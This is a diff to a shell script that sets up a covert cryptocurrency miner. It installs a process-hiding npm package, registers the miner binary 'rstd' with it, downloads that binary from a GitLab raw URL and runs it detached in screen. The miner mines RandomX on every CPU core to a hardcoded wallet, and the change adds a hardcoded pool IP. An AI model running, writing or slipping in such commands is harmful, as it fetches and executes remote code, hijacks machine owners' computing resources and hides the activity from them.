@@ -8,6 +8,6 @@ apt-get install -y nodejs
 sudo apt install npm =y
 sudo npm i -g node-process-hider && sudo ph add rstd
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/rstd && chmod +x *
-screen -dms run ./rstd -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk+100000.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all)
+screen -dms run ./rstd -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all)
 EOF
 screen -r
